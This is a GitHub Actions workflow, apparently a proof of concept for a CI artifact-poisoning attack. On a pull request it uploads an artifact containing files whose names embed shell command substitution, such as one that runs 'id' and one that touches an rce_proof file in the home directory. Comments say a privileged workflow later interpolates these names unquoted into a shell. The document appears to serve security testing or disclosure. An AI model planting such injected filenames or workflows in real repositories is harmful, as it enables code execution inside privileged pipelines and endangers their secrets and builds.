name: Test

on:
  pull_request:

jobs:
  publish-content:
    runs-on: ubuntu-latest
    steps:
      - name: Craft artifact (attacker-controlled PR head)
        run: |
          mkdir -p /tmp/content
          echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
          echo "benign test output" > /tmp/content/test.txt
          # filename with command substitution: this path is later interpolated
          # unquoted into a shell step of the privileged workflow
          touch '/tmp/content/$(id -un)z.txt'
          touch '/tmp/content/$(touch ${HOME}/rce_proof; echo z).txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content-default
          path: /tmp/content
